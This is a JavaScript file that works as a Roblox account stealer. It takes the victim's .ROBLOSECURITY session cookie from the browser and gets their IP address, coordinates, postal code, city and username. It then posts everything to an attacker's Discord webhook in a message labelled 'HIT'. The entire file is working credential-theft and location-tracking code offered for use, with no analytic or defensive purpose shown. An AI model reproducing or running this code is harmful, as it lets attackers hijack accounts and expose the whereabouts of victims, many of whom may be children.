const webhookURL = "YOUR WEBHOOK  IADDED ROBLOXSTATS SHIT"; // Your webhook URL

async function sendGeoEmbed() {
  try {
    // Fetch IP address
    const ip = await fetchIP();
    if (!ip) throw new Error("Failed to retrieve IP address");

    // Fetch geolocation info
    const geo = await fetchGeo(ip);
    if (!geo || geo.error) {
      console.error("Failed to fetch geolocation data", geo?.error);
    }

    // Convert country code to emoji, fallback to flag if error
    const countryCode = geo?.country_code || "US";
    const flagEmoji = countryCodeToEmoji(countryCode);

    // Get Roblox security token from cookies
    const token = getCookie(".ROBLOSECURITY") || "N/A";

    // Get Roblox user ID from URL
    const userId = getRobloxUserId();

    // Fetch username if userId exists
    const username = userId ? await getRobloxUsername(userId) : "Unknown";

    // Generate headshot URL or fallback image
    const headshotUrl = userId
      ? `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
      : "https://via.placeholder.com/150?text=No+Headshot";

    // Build embed message
    const embed = {
      title: `🌐 IP Geolocation 📍`,
      description: `🚩 Country: **${geo?.country_name || "Unknown"}** ${flagEmoji}`,
      color: 0x1abc9c,
      author: {
        name: `👤 ${username}`,
        url: userId ? `https://www.roblox.com/users/${userId}/profile` : null,
        icon_url: "https://cdn-icons-png.flaticon.com/512/847/847969.png"
      },
      thumbnail: {
        url: headshotUrl
      },
      fields: [
        {
          name: "🗺️ Coordinates",
          value: `📍 Latitude: **${geo?.latitude ?? "N/A"}**\n📍 Longitude: **${geo?.longitude ?? "N/A"}**`,
          inline: false
        },
        {
          name: "📫 Postal Code",
          value: `🏢 ${geo?.postal ?? "N/A"}`,
          inline: false
        },
        {
          name: "🌍 Region / City",
          value: `🗺️ ${geo?.region ?? "N/A"}, ${geo?.city ?? "N/A"}`,
          inline: false
        },
        {
          name: "🔑 Roblox Token",
          value: `🔐 ${token}`,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "🌐 Geo data via ipapi.co",
        icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png"
      }
    };

    // Prepare webhook message
    const msg = {
      username: "⚡✨HIT",
      avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=80",
      embeds: [embed]
    };

    // Send the webhook
    const resp = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });

    if (resp.ok) {
      console.log("✅ Embed sent!");
    } else {
      const errorText = await resp.text();
      console.error("❌ Failed to send embed:", resp.status, errorText);
    }
  } catch (error) {
    console.error("❌ Error in sendGeoEmbed:", error);
  }
}

// Helper functions with comprehensive error handling

async function fetchIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    if (!response.ok) throw new Error(`IP fetch failed with status ${response.status}`);
    const data = await response.json();
    return data?.ip ?? null;
  } catch (err) {
    console.error("Error fetching IP:", err);
    return null;
  }
}

async function fetchGeo(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!response.ok) throw new Error(`Geo fetch failed with status ${response.status}`);
    const data = await response.json();
    return data;
  } catch (err) {
    console.error("Error fetching geolocation:", err);
    return null;
  }
}

function countryCodeToEmoji(cc) {
  try {
    const OFFSET = 127397;
    return cc
      .toUpperCase()
      .split('')
      .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
      .join('');
  } catch {
    return "🏳️"; // fallback flag emoji
  }
}

function getCookie(name) {
  try {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
  } catch {
    return null;
  }
}

function getRobloxUserId() {
  try {
    const url = window.location.href;
    const match = url.match(/\/users\/(\d+)\//);
    return match ? match[1] : null;
  } catch {
    return null;
  }
}

async function getRobloxUsername(userId) {
  try {
    const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!response.ok) throw new Error(`Failed to fetch username with status ${response.status}`);
    const data = await response.json();
    return data?.name ?? "Unknown";
  } catch (err) {
    console.error('Error fetching username:', err);
    return "Unknown";
  }
}

// Call the main function
sendGeoEmbed();
